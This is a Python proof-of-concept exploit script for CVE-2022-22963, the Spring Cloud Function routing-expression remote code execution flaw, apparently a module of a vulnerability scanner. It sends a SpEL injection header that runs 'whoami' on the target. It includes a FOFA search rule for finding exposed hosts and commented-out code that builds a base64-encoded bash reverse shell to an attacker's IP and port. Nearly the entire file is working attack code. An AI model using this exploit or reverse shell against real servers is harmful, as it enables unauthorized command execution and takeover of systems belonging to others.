#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import requests.packages.urllib3
from Config.config_requests import ua
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# 脚本信息
######################################################
NAME = 'CVE_2022_22963'
AUTHOR = "境心"
REMARK = 'spring_function_rce'
FOFA_RULE = 'icon_hash="116323821"'
######################################################


def poc(target,):
    result = {}
    url = target + "/functionRouter"
    # 反弹shell部分
    # cmd = 'bash -i >&/dev/tcp/' + ip + '/' + port + ' 0>&1'
    # cmd = cmd.encode('utf-8')
    # cmd = str(base64.b64encode(cmd))
    # cmd = cmd.strip('b')
    # cmd = cmd.strip("'")d = 'bash -c {echo,' + cmd + '}|{base64,-d}|{bash,-i}'
    headers = {
        'User-Agent': ua,
        'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("whoami")'
    }
    data = {
        'a': 'b'
    }
    res = requests.post(url, headers=headers, data=data, verify=False, timeout=5)
    if res.status_code == 500 and '"error":"Internal Server Error"' in res.text:
        result['vurl'] = url
        result['poc'] = NAME
        result['message'] = "spring_function_rce"
        # print(result)
        return result


if __name__ == '__main__':
    poc("https://127.0.0.1/")



